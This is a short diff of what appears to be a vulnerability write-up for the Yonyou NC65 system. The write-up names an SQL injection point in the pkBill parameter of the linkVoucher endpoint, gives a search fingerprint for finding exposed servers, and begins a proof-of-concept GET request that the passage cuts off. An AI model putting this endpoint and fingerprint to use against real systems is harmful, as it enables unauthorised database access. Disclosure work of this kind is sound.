@@ -8,7 +8,7 @@ NC65系统/portal/pt/yercommon/linkVoucher请求中pkBill存在SQL注入漏洞�
 title="YONYOU NC"
 ```
 
-## poc
+## POC
 
 ```
 GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1 HTTP/1.1
